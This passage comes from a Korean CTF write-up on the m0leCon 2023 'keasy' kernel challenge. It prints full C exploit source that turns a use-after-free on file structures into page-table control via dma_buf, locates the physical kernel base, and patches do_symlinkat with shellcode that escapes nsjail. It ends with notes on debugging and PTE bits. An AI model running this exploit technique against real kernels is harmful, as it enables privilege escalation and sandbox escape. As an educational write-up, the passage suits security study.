    p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
    *(size_t*)p = user_rflags;
    p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
    *(size_t*)p = user_rsp;
    p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
    *(size_t*)p = user_ss;

    // 덮기
    memcpy(affected_addr + (phys_func & 0xfff), shellcode, sizeof(shellcode));
    puts("[+] GO!GO!");

    // 여기서 symlink를 호출하며 넣어둔 shellcode로 실행 흐름이 넘어감
    fflush(stdout);
    printf("%d\n", symlink("a", "a"));
    puts("[-] Failed...");
    close(fd);
    getchar();
    return 0;
}

{% endhighlight %}
</details>

실행하면 `/dev/sda`에 쓰여진 값이 잘 출력된 것을 볼 수 있다. 

<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/win.png" alt="win.png">
</center>

# 참고사항

## 디버깅하며 메모리 살펴보기

디버깅을 할 때, 흐름은 만들어 둔 exploit을 따라가면서 눈으로는 커널 영역의 메모리를 보고 싶은 경우가 많다. 그러나 Page Table Isolation(PTI)때문에
context가 커널 영역일 때만(이때는 CR3 레지스터가 커널의 PGD를 가리키므로) 커널 영역의 메모리를 볼 수 있고, context가 유저 영역일 때는 절대로 커널 영역의 메모리를 볼 수 없다.
따라서 메모리를 봐야 할 것 같은 시점에 `syscall(SYS_getpid);`등의 간단한 syscall을 넣어 실행 흐름에 영향을 전혀 주지 않으면서 커널 영역으로 context를 옮기도록 해 주면 된다.

GDB에서는 다음과 같이 실제 syscall이 수행되는 `syscall() + 0x112`에 BP를 걸고, `si`를 통해 커널로 context를 옮긴 후 원하는 메모리를 보면 된다. 글에서 중간중간 메모리 상황을 확인하기 위해
설치해 둔 `syscall()`을 포함한 전체 소스는 아래와 같다.

<details>
<summary>펼치기/접기</summary>
{% highlight c %}
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/syscall.h>

#define COUNT_PAGES 0x200
#define COUNT_FILES 0x100

#define DMA_HEAP_IOCTL_ALLOC 0xc0184800

typedef unsigned long long u64;
typedef unsigned int u32;
struct dma_heap_allocation_data {
u64 len;
u32 fd;
u32 fd_flags;
u64 heap_flags;
};

unsigned long user_cs, user_ss, user_rsp, user_rflags;
static void save_state() {
asm(
"movq %%cs, %0\n"
"movq %%ss, %1\n"
"movq %%rsp, %2\n"
"pushfq\n"
"popq %3\n"
: "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
:
: "memory");
}

static void win() {
char buf[0x100];
int fd = open("/dev/sda", O_RDONLY);
if (fd < 0) {
puts("[-] Lose...");
} else {
puts("[+] Win!");
read(fd, buf, 0x100);
write(1, buf, 0x100);
puts("[+] Done");
}
exit(0);
}


void bind_core(int core) {
cpu_set_t cpu_set;
CPU_ZERO(&cpu_set);
CPU_SET(core, &cpu_set);
sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void fatal(const char *msg) {
perror(msg);
exit(1);
}

int main() {
save_state();
setvbuf(stdout, 0, 2, 0);
bind_core(0);

    int dmafd = creat("/dev/dma_heap/system", O_RDWR);
    int fd = open("/dev/keasy", O_RDWR);

    // 다수 페이지 할당 -> 아직 PTE는 할당되지 않음 (쓰기/읽기가 없었기 때문에)
    char *pages[COUNT_PAGES];
    for (int i = 0; i < COUNT_PAGES; i++) {
        pages[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                             0x8000, PROT_READ|PROT_WRITE,
                             MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    }

    int files[COUNT_FILES];

    // 우선 기존의 dedicated cache를 채워야 함
    printf("[*] spraying files, from 0 to %d\n", COUNT_FILES / 2 - 1);
    for (int i = 0; i < COUNT_FILES / 2; i++) {
        files[i] = open("/", O_RDONLY);
    }

    // 여기서 dangling ptr 얻기
    // 마지막으로 할당받은 fd에서 하나 더한 값임
    int easy_fd = files[COUNT_FILES / 2 - 1] + 1;

    // 해제
    printf("[*] makeing dangling ptr\n");
    printf("[*] last allocated fd was %d\n", files[COUNT_FILES / 2 - 1]);
    ioctl(fd, 0, 0xdeadbeef);

    // 나머지 file spray
    printf("[*] spraying files, from %d to %d\n", COUNT_FILES / 2, COUNT_FILES);
    for (int i = COUNT_FILES / 2; i < COUNT_FILES; i++) {
        files[i] = open("/", O_RDONLY);
    }

    // 다 닫아서 recycle 유도
    printf("[*] closing all files\n");
    for (int i = 0; i < COUNT_FILES; i++) {
        close(files[i]);
    }

    // 이제 dedicated cache가 recycle되었지만, easy_fd로 여전히 접근이 가능함
    // PTE 할당 유도
    printf("[*] writing to pages\n");
    // Allocate many PTEs (page fault)
    for (int i = 0; i < COUNT_PAGES / 2; i++)
        for (int j = 0; j < 8; j++)
            *(pages[i] + j*0x1000) = 'A' + j;

    // 중간에 dma_buf를 끼워넣음
    int dma_buf_fd = -1;
    struct dma_heap_allocation_data data;
    data.len = 0x1000;
    data.fd_flags = O_RDWR;
    data.heap_flags = 0;
    data.fd = 0;
    if (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &data) < 0)
        fatal("DMA alloc failed");

    printf("[+] dma_buf_fd: %d\n", dma_buf_fd = data.fd);

    for (int i = COUNT_PAGES / 2; i < COUNT_PAGES; i++)
        for (int j = 0; j < 8; j++)
            *(pages[i] + j*0x1000) = 'A' + j;

    syscall(SYS_getpid);

    // 영향을 받는 PTE를 알아내야 하기 때문에 PTE의 entry 7 (+0x38)의 값을 조작함
    // -> 원래 file 구조체의 f_count 필드가 있는 위치이므로 dup(fd)를 통해 1씩 증가가 가능함
    // 0x1000번 증가시키면 다음 page를 가리키게 되므로 H가 아닌 다른 값이 쓰여있을 것임
    for (int i = 0; i < 0x1000; i++) {
        if (dup(easy_fd) < 0) {
            fatal("dup");
        }
    }
    printf("[*] dup\n");
    syscall(SYS_getpid);

    // spray한 pages를 돌면서 easy_fd로 조작가능한 page 가상주소를 알아낼 수 있음
    char *evil = NULL;
    for (int i = 0; i < COUNT_PAGES; i++) {
        printf("[+] probing %p...", pages[i] + 0x7000);
        fflush(stdout);
        if (*(pages[i] + 0x7000) != 'A' + 7) {
            evil = pages[i] + 0x7000;
            break;
        }
        printf("fail\n");
    }
    printf("success\n[*] affected address: %p\n", evil);

    // 이제 이 주소를 munmap()한 후 dma_buf로 mmap()하면
    // 이 주소 전체에 대한 읽기/쓰기를 할 수 있게 됨
    munmap(evil, 0x1000);
    char *dma_buf = mmap(evil, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);
    syscall(SYS_getpid);

    // 다음으로 한 번 더 dup() 호출을 통해 이제는 dma_buf가 가리키고 있는 page를
    // 다음 페이지를 가리키도록 하면
    // 다음 페이지에 있는 PTE를 dma_buf를 통해 접근해서 조작할 수 있음
    for (int i = 0; i < 0x1000; i++) {
        if (dup(easy_fd) == -1) {
            fatal("dup");
        }
    }
    syscall(SYS_getpid);

    // 이제 dma_buf에 쓰고 읽으면 PTE를 조작할 수 있게 됨


    // 커널의 물리 베이스 주소를 구함
    void *affected_addr = NULL;
    // 0x9c000 주소에는 커널의 물리 주소 base가 적혀 있고
    // 이 물리 주소는 항상 고정임
    *(size_t*)dma_buf = 0x800000000009c067;
    syscall(SYS_getpid);

    // dma_buf를 통해 수정한 PTE의 영향을 받는 주소를 알아내고
    // 이 주소에서 값을 읽어 커널의 물리 주소를 알아냄
    for (int i = 0; i < COUNT_PAGES; i++) {
        if (pages[i] == evil) continue;
        // 위의 PTE 수정을 통해 값이 바뀐 주소에는 우리가 쓴 값 ('A'..'G')가 아니라
        // 이보다 훨씬 큰 값이 쓰여 있을 것이기 때문에
        // 이를 통해 영향받는 page를 알아낼 수 있게 됨
        if (*(size_t*)pages[i] > 0xffff) {
            affected_addr = pages[i];
            printf("[+] Found victim page table: %p\n", affected_addr);
            break;
        }
    }
    // 0xfff -> 하위 12비트, flags
    size_t phys_base = ((*(size_t*)affected_addr) & ~0xfff) - 0x1c04000;
    printf("[+] Physical kernel base address: 0x%016lx\n", phys_base);

    puts("[+] Overwriting do_symlinkat...");
    size_t phys_func = phys_base + 0x24d4c0;  // symlinkat의 offset
    *(size_t*)dma_buf = (phys_func & ~0xfff) | 0x8000000000000067;
    syscall(SYS_getpid);
    // 0x8...67에서
    // 0x8.. -> NX
    // 0x...67 -> P, RW, US, A, D

    // nsjail에서 나가고 win으로 넘어감
    // 이때 pid는 0x1111...,
    // win 주소는 0x2222...,
    // cs는 0x3333...,
    // rflags는 0x4444...,
    // stack는 0x5555...,
    // ss는 0x6666...,
    // 으로 표시해둠

    char shellcode[] = {0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49, 0x81, 0xef, 0xc9, 0xd4, 0x24, 0x00, 0x49, 0x8d, 0xbf, 0xd8, 0x5e, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x20, 0xe6, 0x0a, 0x00, 0xff, 0xd0, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x49, 0x8d, 0xb7, 0xe0, 0x5c, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x40, 0xc1, 0x0a, 0x00, 0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x48, 0x82, 0x53, 0x01, 0x49, 0x8d, 0x87, 0x90, 0xf8, 0x27, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc3, 0x48, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x98, 0x40, 0x07, 0x00, 0x00, 0x31, 0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0x44, 0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8d, 0x87, 0x41, 0x0f, 0xc0, 0x00, 0xff, 0xe0, 0xcc};
    void *p;

    // 쉘코드 짤 때 넣어놨던 임시 값들을
    // 실제 값으로 수정
    p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
    *(size_t*)p = getpid();
    p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
    *(size_t*)p = (size_t)&win;
    p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
    *(size_t*)p = user_cs;
    p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
    *(size_t*)p = user_rflags;
    p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
    *(size_t*)p = user_rsp;
    p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
    *(size_t*)p = user_ss;

    // 덮기
    memcpy(affected_addr + (phys_func & 0xfff), shellcode, sizeof(shellcode));
    syscall(SYS_getpid);
    puts("[+] GO!GO!");

    // 여기서 symlink를 호출하며 넣어둔 shellcode로 실행 흐름이 넘어감
    fflush(stdout);
    printf("%d\n", symlink("a", "a"));
    puts("[-] Failed...");
    close(fd);
    getchar();
    return 0;
}

{% endhighlight %}
</details>

## PTE의 값과 물리 주소

위의 그림에서 봤듯, 실제로 PTE에 적힌 값이 그대로 물리 주소가 되는 것이 아니다. 예를 들어 PTE에 다음과 같은 값이 있다고 하자.

**<center>0x8000000137d3a067</center>**

여기서 실제 물리 페이지 프레임 주소를 기록한 부분은 `0x137d3a`로, 이 엔트리가 가리키고 있는 물리 주소는 `0x137d3a000`이다.

참고로 맨 처음 비트인 1(`0x8 = 0b1000`)은 NX(XD)비트를 나타낸다. 즉 이 물리 프레임은 실행이 불가능하다는 뜻이다. 하위 12비트(`0x067 = 0b0110 0111`)는 각각
`P`, `RW`, `US`, `A`, `D`를 나타내는 비트들이다. 이 비트들에 대한 설명은 [이 글](/kernel-analysis/page-table-analysis/) 마지막의 PTE 구조에 대한 표를 참고하자.


[^1]: 한 파일에 대해서 65535개까지의 file descriptor를 가질 수 있기 때문이다.
